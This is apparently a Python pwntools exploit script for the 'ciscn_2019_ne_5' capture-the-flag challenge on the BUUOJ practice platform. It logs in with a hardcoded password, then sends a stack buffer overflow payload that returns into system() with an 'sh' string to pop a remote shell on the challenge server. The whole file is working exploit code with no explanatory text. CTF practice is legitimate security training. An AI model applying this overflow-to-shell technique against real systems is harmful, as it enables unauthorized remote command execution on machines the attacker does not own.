from pwn import *


def ciscn_2019_ne_5(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_ne_5'):
    target = process([file_name])
    target = remote('node5.buuoj.cn', 26081)
    target_elf = ELF(file_name)

    system_plt = p32(target_elf.plt['system'])
    sh_str = p32(next(target_elf.search(b'sh')))

    payload = b'A' * (0x48 + 0x4)
    # system(sh)
    payload += system_plt + p32(0xdeadbeef) + sh_str

    target.sendlineafter(b'password:', b'administrator')
    target.sendlineafter(b'0.Exit\n', b'1')
    target.sendline(payload)
    target.sendlineafter(b'0.Exit\n', b'4')

    target.interactive()


if __name__ == '__main__':
    ciscn_2019_ne_5()
